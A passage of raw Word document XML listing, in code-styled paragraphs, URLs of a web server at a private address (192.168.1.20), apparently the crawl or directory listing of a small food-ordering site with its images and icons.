    <w:p w14:paraId="359B35FF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/css/bootstrap.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E734172" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/favicon.ico</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A262AB" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/foodzone.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB0130F" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D81798" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340DE056" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons/back.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13640CFA" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons/blank.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00527C1C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons/folder.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776FF4DE" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons/image2.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D11D96B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons/text.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CEADF8" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/icons/unknown.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F4E39A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CC62FD" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFE47CC" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49152650" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/base-bg.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6BB6A9" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/head-img.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4B44F0" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/head-img2.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A09955" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/icon_menu.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34272C52" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img001.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDC027B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img002.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C580777" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img003.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382357D1" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img004.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EECC2DE" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img005.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFCA59A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img006.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4669CE73" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img007.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6421F2E2" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img008.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056FB188" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img009.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FA5153" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img010.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260EA95B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img011.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B83D77C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>http://192.168.1.20/images/img012.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEE7834" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img013.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768639A8" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img014.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165EC8E9" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img015.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4E5541" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img016.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51298ACF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img017.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BF0C21" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img018.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59411B2A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img019.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BBF78B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img020.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13146ECF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img021.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EBB07A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img022.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DDF16B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img023.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72835914" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img024.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FD51D9" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/img025.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1839B5CB" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/logo.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FFFCEB" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/logo2.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F96AADA" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22251AD4" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza-inn-map4-mombasa-road.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0483023F" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F9EC73" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF0CF24" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/Romans.xcf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77479056" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img001.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F79219D" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img002.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350B4CF1" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img003.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D938947" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img004.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70062675" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img005.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FE4327" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img006.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5362F154" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img007.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D10C45" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img008.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD063FF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img009.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4898F891" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img010.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F849EBB" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img011.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCA2D6D" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img012.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203D58A2" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img013.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7E14DE" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
